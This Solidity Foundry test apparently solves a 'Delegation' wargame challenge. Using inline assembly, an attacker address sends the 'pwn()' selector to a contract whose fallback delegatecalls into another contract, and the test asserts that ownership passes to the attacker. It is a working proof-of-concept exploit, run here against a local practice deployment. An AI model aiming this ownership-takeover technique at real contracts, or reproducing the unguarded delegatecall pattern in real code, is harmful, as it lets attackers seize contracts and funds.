pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract ASMDelegation is Test {
    address public attacker = address(420);
    Delegation public target;
    Delegate public newDelegate;

    function setUp() public {
        newDelegate = new Delegate(address(0));
        target = new Delegation(address(newDelegate));
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMDelegation() public attack {
        assembly {
            // make a call to the target using the function selector for "pwn()"
            let ptr := mload(0x40)

            // function selector, padded correctly
            mstore(ptr, shl(0xe0, 0xdd365b8b))

            // call the target
            let success := call(gas(), sload(target.slot), 0, ptr, 0x04, 0, 0)

            if iszero(success) {
                revert(0, 0)
            }
        }
        assertEq(target.owner(), attacker);
    }
}
